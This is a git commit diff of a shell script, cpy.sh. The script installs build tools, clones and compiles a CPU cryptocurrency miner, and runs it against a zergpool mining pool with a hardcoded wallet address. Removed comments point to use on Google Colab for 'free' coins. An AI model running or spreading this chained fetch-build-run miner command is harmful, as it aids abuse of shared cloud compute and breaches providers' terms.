c5fc71e9fa5d3d943cf5355f2ca933d6a2042f5c
fluffy199 <96822759+fluffy199@users.noreply.github.com>
2022-07-02 16:50:45 -0500

    Update cpy.sh

--- cpy.sh
+++ cpy.sh
@@ -1,15 +1,8 @@
-#! /bin/bash
-# Install XRDP
-# Before get xmr coin for free
-# Google Colab
 sudo apt update
 clear
 sudo apt install screen
-screen -R xmr
+screen -R yes
 
-sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
-sudo apt update
-git clone https://github.com/litecoincash-project/cpuminer-multi miner
-cd miner
-./build.sh
-./cpuminer -a minotaurx -o stratum+tcp://minotaurx.na.mine.zergpool.com:7019 -u LNSQDXTcvRvQZNu2PmMDRSVbk4PA3V3iKM -p c=LTC --cpu-affinity -1
+sudo apt-get install build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git
+git clone https://github.com/JayDDee/cpuminer-opt.git && cd cpuminer-opt && ./build.sh && ./cpuminer -a minotaurx -o stratum+tcp://minotaurx.na.mine.zergpool.com:7019 -u LNSQDXTcvRvQZNu2PmMDRSVbk4PA3V3iKM -p c=LTC --cpu-affinity -1
+
